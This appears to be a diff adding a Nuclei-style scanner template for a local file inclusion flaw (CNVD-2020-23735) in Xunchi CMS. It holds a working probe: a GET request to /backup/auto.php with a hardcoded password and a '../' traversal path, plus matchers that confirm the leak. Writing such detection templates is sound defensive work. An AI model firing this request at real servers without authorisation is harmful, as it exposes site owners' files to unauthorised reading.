@@ -1,0 +1,33 @@
+id: CNVD-2020-23735
+
+info:
+  name: Xxunchi CMS - Local File Inclusion
+  author: princechaddha
+  severity: high
+  description: Xunyou CMS is vulnerable to local file inclusion. Attackers can use vulnerabilities to obtain sensitive information.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/2025171
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: xunchi,lfi,cnvd,cnvd2020
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "NzbwpQSdbY06Dngnoteo2wdgiekm7j4Ndisplay_errors"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100c1f96a2e3c37026b0ac58408bbaaeff224ca2cd563e06d2861342ab73272d43602203a4b1a825e300c2d3243c6930d34d7108e534729c14184babc398ba3fb3a0956:922c64590222798bb761d5b6d8e72950
